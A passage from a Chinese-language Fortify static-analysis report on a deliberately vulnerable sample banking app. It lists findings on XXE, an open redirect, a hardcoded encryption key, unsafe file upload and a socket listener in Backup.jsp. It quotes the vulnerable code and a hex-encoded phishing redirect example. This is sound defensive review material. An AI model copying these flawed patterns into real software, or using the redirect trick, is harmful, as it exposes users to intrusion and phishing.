                                <Value>应对 XML unmarshaller 进行安全配置，使它不允许将外部实体包含在传入的 XML 文档中。

为了避免 XXE injection，请勿将直接处理 XML 源的 unmarshal 方法用作 java.io.File、java.io.Reader 或 java.io.InputStream。使用安全配置的解析器解析文档并使用将安全解析器作为 XML 源的 unmarshal 方法，如下面的示例所示：


DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(&lt;XML Source&gt;);
Model model = (Model) u.unmarshal(document);
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="53FE056E5BEC34B41F2E999547AED8B2" ruleID="4B1396F4-255F-4952-BC09-B82ACB650FE8">
                            <Category>XML External Entity Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制外部实体进行解析。这会使解析器暴露在 XML External Entities 攻击之下.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>            factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            return factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
        }
        catch (SAXException ex)</Snippet>
                                <TargetFunction>javax.xml.parsers.DocumentBuilder.parse()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>102</LineStart>
                                <Snippet>    @Produces("application/xml")
    @Consumes("application/xml")
    public String AddAccount(String representation) {
        try {
            String username;</Snippet>
                                <TargetFunction>AddAccount(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F3E611D857EF365BE1AC67BE6472C80C" ruleID="4B1396F4-255F-4952-BC09-B82ACB650FE8">
                            <Category>XML External Entity Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制外部实体进行解析。这会使解析器暴露在 XML External Entities 攻击之下.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>            factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            return factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
        }
        catch (SAXException ex)</Snippet>
                                <TargetFunction>javax.xml.parsers.DocumentBuilder.parse()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>124</LineStart>
                                <Snippet>    @Produces("application/xml")
    @Consumes("application/xml")
    public String WriteCheck(String representation) {
        try {
          String username = XMLUtil.GetValueXML(representation, "transaction", "payee");</Snippet>
                                <TargetFunction>WriteCheck(0)</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: JVM Termination</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在 AdminUtil.java 的第 109 行调用 debugAdminRoles() 中的 exit() 会关闭 Web 应用程序容器。Web 应用程序不应试图关闭自身的容器。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>让 Web 应用程序试图关闭自身的容器并不是什么好主意。调用终止方法的操作可能包含在遗忘调试代码中，或者包含在从非 J2EE 应用程序导入的代码中。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>绝不要在 Web 应用程序中调用终止方法。在 J2EE 应用程序中的此类方法调用会导致软件的安全性较差，因此应删除这段代码。不管是否存在威胁，应用程序中存在这样的代码都是不合理的。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. J2EE 应用程序调用 exit() 或 halt() 时，表明应用程序中可能存在其他问题。在查找调用 exit() 或 halt() 的操作时，请检查是否存在其他迹象，表明开发人员编程时过于仓促，或在没有适当考虑安全和质量问题的情况下，将大量非 J2EE 代码引入到了应用程序中。

2. 如果您审计的是一个非 J2EE Java 应用程序，J2EE Bad Practices 类别可能不适用于您的环境。在这种情况下，您可以使用 AuditGuide 来消除这些问题。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D776A141CA061901F4C54D1231689A11" ruleID="9D479AB5-B986-492C-B1F0-C11F2FD623F7">
                            <Category>J2EE Bad Practices: JVM Termination</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>在 AdminUtil.java 的第 109 行调用 debugAdminRoles() 中的 exit() 会关闭 Web 应用程序容器。Web 应用程序不应试图关闭自身的容器。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>109</LineStart>
                                <Snippet>		finally {
		   System.err.println("Terminating here temporarily");
		   System.exit(-1);

		   if (statement != null) {</Snippet>
                                <TargetFunction>exit()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: Sockets</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Backup.jsp 中的 _jspService() 方法会调用 ServerSocket()。在 Web 应用程序中使用基于套接字的通信往往容易出错。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>只有在与比较陈旧的系统进行通信时，J2EE 标准才允许 use of sockets，因为此时没有较高高级别的协议可用。自己编写通信协议将需要解决许多安全上的问题，包括：

— 输入信号与输出信号的比较

— 协议版本间的兼容性

— 通道安全

— 错误处理

— 网络限制（防火墙）

— 会话管理

若不经过安全专家的详细审查，自定义的通信协议将面临诸多安全隐患。

在自定义标准协议的应用过程中，也会碰到许多同样的问题。通常有很多可用的资源都可以解决与标准协议相关的各种安全问题，然而，攻击者也能获取这些资源。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>应使用行业标准协议或框架来替代自定义的通讯协议。您首先应考虑是否可以使用现有协议，如 HTTP、FTP、SMTP、CORBA、RMI/IIOP、EJB 或 SOAP。

对于选择的协议实现方法，应考虑对其安全进行跟踪记录。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 如果要审计非 J2EE Java 应用程序，J2EE Bad Practices 类别可能不适用于您的环境。在这种情况下，您可以使用 AuditGuide 来消除这些问题。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7EFF74DA3C7769E2757405AB549D0494" ruleID="73B5DD01-BFBE-4CD5-8759-C432873136FB">
                            <Category>J2EE Bad Practices: Sockets</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Backup.jsp 中的 _jspService() 方法会调用 ServerSocket()。在 Web 应用程序中使用基于套接字的通信往往容易出错。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>2</LineStart>
                                <Snippet>&lt;%
  java.net.ServerSocket srvr = new java.net.ServerSocket(666);

  java.net.Socket skt = srvr.accept();</Snippet>
                                <TargetFunction>ServerSocket()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Web 应用程序必须定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。

因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：


&lt;error-page&gt;
   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;404&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;500&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="484A8947CBBCC795A2BE3BFB63F11C21" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Web 应用程序必须定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>weblogic_web.xml</FileName>
                                <FilePath>WEB-INF/weblogic_web.xml</FilePath>
                                <LineStart>7</LineStart>
                                <Snippet>
                                    xmlns="http://java.sun.com/xml/ns/j2ee"
                                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"&gt;
  &lt;display-name&gt;riches&lt;/display-name&gt;


                                </Snippet>
                                <TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Key Management: Hardcoded Encryption Key</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>硬编码加密密钥可能会削弱安全性，一旦出现安全问题将无法轻易修正。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>使用硬编码方式处理加密密钥绝非好方法，因为这样所有项目开发人员都能查看该加密密钥，而且还会使解决这一问题变得极其困难。在代码投入使用之后，必须对软件进行修补才能更改加密密钥。如果受加密密钥保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。


例 1：下列代码使用了硬编码加密密钥：


...
private static final String encryptionKey = "lakdsljkalkjlksdfkl";
byte[] keyBytes = encryptionKey.getBytes();
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher encryptCipher = Cipher.getInstance("AES");
encryptCipher.init(Cipher.ENCRYPT_MODE, key);
...


任何可访问该代码的人都能访问加密密钥。在应用程序发布之后，除非对程序进行修补，否则将无法更改加密密钥。雇员可以利用手中掌握的信息访问权限入侵系统。如果攻击者可以访问应用程序的可执行文件，他们就可以提取加密密钥值。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>请勿对加密密钥进行硬编码，而应对加密密钥加以模糊化，并在外部资源文件中进行管理。如果在系统中采用明文的形式存储加密密钥，任何有足够权限的人即可读取加密密钥，还可能误用这些密码。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="57DCA6D531F5A85A7875523B3F4781DF" ruleID="7864EF8A-A7EA-4077-AADB-A6D6DFAD3235">
                            <Category>Key Management: Hardcoded Encryption Key</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>硬编码加密密钥可能会削弱安全性，一旦出现安全问题将无法轻易修正。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformTransfer.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformTransfer.java</FilePath>
                                <LineStart>45</LineStart>
                                <Snippet>	    try{
		    byte[] theKey={'a'};
		    SecretKeySpec skeySpec = new SecretKeySpec(theKey, "AES");
		    Cipher cipher = Cipher.getInstance("AES");
		    cipher.init(Cipher.ENCRYPT_MODE, skeySpec); // Exception thrown:java.security.InvalidKeyException: Invalid AES key length: 1 bytes</Snippet>
                                <TargetFunction>FunctionCall: SecretKeySpec()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Missing XML Validation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>解析第 29 行的 XML 之前，无法对 XMLUtil.java 中的方法 getDocument() 进行校验，从而为攻击者进行恶意输入提供了可乘之机。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>最成功的攻击往往会从违反程序员的假设开始。不经过 DTD 或 XML schema 的校验，就直接接受 XML 文档，这样一来，程序员就会为攻击者打开了一扇大门，可以向程序提供无法预测、不合理或是恶意的输入。当然，XML 解析器不可能校验文档中出现的所有内容；任何解析器都无法完全理解数据的全部语意。然而，解析器可以进行完整而彻底的检查文档结构，从而保证处理文档的代码在内容安排上的合理性。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>若创建 XML 解析器或解析器代理，务必启用校验功能。由于用来定义结构的文件规则错综复杂，或是人们完全不了解，而给校验带来了一些问题，那么在其附近有可能潜藏着某些安全漏洞。

以下示例演示了如何为 Xerces 解析器（DOM 和 SAX）启用验证：


org.apache.xerces.framework.XMLParser: parser.setValidation(true);
org.apache.xerces.framework.XMLParser: parser.setValidationSchema(true);


接下来的例子演示了如何在 javax 库中为 SAX 和 DOM 解析器代理启用校验功能。

javax SAX 解析器代理：


javax.xml.parsers.SAXParserFactory: factory.setValidating(true);
javax.xml.parsers.SAXParserFactory: factory.setFeature("http://xml.org/sax/features/validation", true);


javax DOM 解析器代理：


javax.xml.parsers.DocumentBuilderFactory: factory.setValidating(true);


接下来的各个例子演示了如何在 javax 库中为单个解析器和 XMLReaders 启用校验功能。

注意：Fortify 软件安全研究团队不建议采用这种方法启用校验功能。相反，您应在解析器代理中启用校验功能。

javax SAX 解析器和读取器：


javax.xml.parsers.SAXParser: parser.setProperty("http://xml.org/sax/features/validation", new Boolean(true));
org.xml.sax.XMLReader: reader.setFeature("http://xml.org/sax/features/validation", true);


以下示例将显示如何为 Apache Axis 设置 XML 返回类型。

Axis 客户端调用：


call.addParameter("testParam", org.apache.axis.Constants.XSD_STRING, javax.xml.rpc.ParameterMode.IN);
call.setReturnType(org.apache.axis.Constants.XSD_STRING);
String ret = (String) call.invoke( new Object[] { "Hello!" } );
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify 安全编码规则包会进行检查，以确保 javax 解析器代理在构造解析器之前启用校验功能。通过确保解析器代理不断构造新校验解析器，可以减少构造和使用解析器过程中发生错误的几率。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="508D0A4AFF20EEA1A7609CE0F5E1640F" ruleID="6205D59D-EEEC-42B0-9522-1FE15F05E302">
                            <Category>Missing XML Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>解析第 29 行的 XML 之前，无法对 XMLUtil.java 中的方法 getDocument() 进行校验，从而为攻击者进行恶意输入提供了可乘之机。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>            factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            return factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
        }
        catch (SAXException ex)</Snippet>
                                <TargetFunction>factory.newDocumentBuilder().parse(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Often Misused: File Upload</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Struts 框架使用 UploadProfilePicture.java 中第 26 行上的 setter 来设置上传文件。允许用户上传文件可能会让攻击者注入危险内容或恶意代码，并在服务器上运行。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>无论编写程序所用的语言是什么，最具破坏性的攻击通常都会涉及执行远程代码，攻击者借此可在程序上下文中成功执行恶意代码。如果允许攻击者向某个可通过 Web 访问的目录上传文件，并能够将这些文件传递给代码解释器（如 JSP/ASPX/PHP），他们就能促使这些文件中包含的恶意代码在服务器上执行。

示例：以下 Struts 2 action 类实现 setter，可将其用于处理上传的文件。

public class Struts2Upload extends ActionSupport
{
    ...
    private File uploadFile;
    public void setUploadFile(File file)
    {
        uploadFile = file;
    }
    ...
}


即使程序将上传的文件存储在一个无法通过 Web 访问的目录中，攻击者仍然有可能通过向服务器环境引入恶意内容来发动其他攻击。如果程序容易出现 path manipulation、command injection 或危险的 file inclusion 漏洞，那么攻击者就可能上传带恶意内容的文件，并利用另一种漏洞促使程序读取或执行该文件。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>如果可以避免附件，请不要接受它们。如果程序必须接受附件，则应当只接受程序所需的特定类型的内容，从而阻止攻击者提供恶意内容。依赖于上传内容的攻击通常要求攻击者能够提供他们自行选择的内容。限制程序能够接受的内容，可以在最大程度上限制可能被攻击的范围。检查文件名、扩展名和文件内容，确保它们都是应用程序所需的，并可供应用程序使用。使攻击者难以确定上传文件的名称和位置。这种解决方法通常是因程序而异的，并且在以下几个方面各不相同：将上传的文件存储在一个目录中（目录名称是在程序初始化时通过强随机值生成的）、为每个上传的文件分配一个随机名称，以及利用数据库中的条目跟踪这些文件 [1]。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2D435C9CAC708EEF162EAB82D04EA154" ruleID="BFDB6B26-66F8-44E4-8772-719C53908B4C">
                            <Category>Often Misused: File Upload</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Struts 框架使用 UploadProfilePicture.java 中第 26 行上的 setter 来设置上传文件。允许用户上传文件可能会让攻击者注入危险内容或恶意代码，并在服务器上运行。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>26</LineStart>
                                <Snippet>    }

    public void setUpload(File file) {
        this.file = file;
    }</Snippet>
                                <TargetFunction>Function: setUpload()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Open Redirect</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>error.jsp 文件将未验证的数据传递给第 3 行的 HTTP 重定向函数。如果允许未验证的输入控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>通过重定向，Web 应用程序能够引导用户访问同一应用程序内的不同网页或访问外部站点。应用程序利用重定向来帮助进行站点导航，有时还跟踪用户退出站点的方式。当 Web 应用程序将客户端重定向到攻击者可以控制的任意 URL 时，就会发生 Open redirect 漏洞：

攻击者可以利用 Open redirect 漏洞诱骗用户访问某个可信赖站点的 URL，并将他们重定向到恶意站点。攻击者通过对 URL 进行编码，使最终用户很难注意到重定向的恶意目标，即使将这一目标作为 URL 参数传递给可信赖的站点时也会发生这种情况。因此，Open redirect 常被作为钓鱼手段的一种而滥用，攻击者通过这种方式来获取最终用户的敏感数据。



例 1：以下 JSP 代码会在用户打开链接时，指示用户浏览器打开从 dest 请求参数中解析的 URL。


    &lt;%
        ...
        String strDest = request.getParameter("dest");
        pageContext.forward(strDest);
        ...
    %&gt;


如果受害者收到一封电子邮件，指示其打开“http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com”链接，该用户就有可能会单击该链接，因为他会认为该链接会转到可信赖的站点。然而，当受害者单击该链接时，Example 1 中的代码就会将浏览器重定向到“http://www.wilyhacker.com”。

很多用户都被告知，要始终监视通过电子邮件收到的 URL，以确保链接指向一个他们所熟知的可信赖站点。尽管如此，如果攻击者对目标 URL 进行 16 进制编码：
"http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D"

那么，即使再聪明的最终用户也可能会被欺骗，打开该链接。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>不应当允许未验证的用户输入控制重定向机制中的目标 URL。而应采用间接方法：创建一份合法 URL 列表，用户可以指定其中的内容并且只能从中进行选择。利用这种方法，就绝不会直接使用用户提供的输入来指定要重定向到的 URL。

例 2：以下代码引用了一个通过有效 URL 传播的数组。用户单击的链接将通过与所需 URL 对应的数组索引来传递。


    &lt;%
        ...
        try {
            int strDest = Integer.parseInt(request.getParameter("dest"));
            if((strDest &gt;= 0) &amp;&amp; (strDest &lt;= strURLArray.length -1 ))
            {
                strFinalURL = strURLArray[strDest];
                pageContext.forward(strFinalURL);
            }
        }
        catch (NumberFormatException nfe) {
            // Handle exception
            ...
        }
        ...
    %&gt;


但在某些情况下，这种方法并不可行，因为这样一份合法 URL 列表过于庞大、难以跟踪。这种情况下，有一种类似的方法也能限制用于重定向用户的域，这种方法至少可以防止攻击者向用户发送恶意的外部站点。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。

2. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="29AF45EC320A09450BDA380364817DE1" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>error.jsp 文件将未验证的数据传递给第 3 行的 HTTP 重定向函数。如果允许未验证的输入控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>error.jsp</FileName>
                                <FilePath>login/error.jsp</FilePath>
                                <LineStart>3</LineStart>
                                <Snippet>&lt;%
    String error = "Invalid credentials for " + request.getParameter("j_username");
    response.sendRedirect(request.getContextPath()+"/login/Login.action?errorMsg="+error);
%&gt;
</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>error.jsp</FileName>
                                <FilePath>login/error.jsp</FilePath>
                                <LineStart>2</LineStart>
                                <Snippet>&lt;%
    String error = "Invalid credentials for " + request.getParameter("j_username");
    response.sendRedirect(request.getContextPath()+"/login/Login.action?errorMsg="+error);
%&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Logging Practice: Logger Not Declared Static Final</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
